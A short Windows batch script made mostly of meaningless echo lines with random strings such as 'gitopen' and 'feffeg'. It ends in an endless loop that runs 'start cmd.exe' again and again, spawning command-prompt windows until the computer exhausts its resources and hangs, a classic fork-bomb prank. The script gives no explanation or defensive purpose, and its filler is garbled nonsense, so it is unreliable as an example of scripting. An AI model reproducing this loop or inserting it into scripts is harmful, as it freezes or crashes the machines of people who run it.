echo this
echo gitopen
echo this
echo gitopen
echo this
echo gitopen dedde
echo this
echo gitopen
echo this
echo gitopen
echo this
echo gitopen jnskkj $idhed
echo this
echo gitopene feffeg
echo this refg
echo gitopen deffe
:a
start cmd.exe
goto a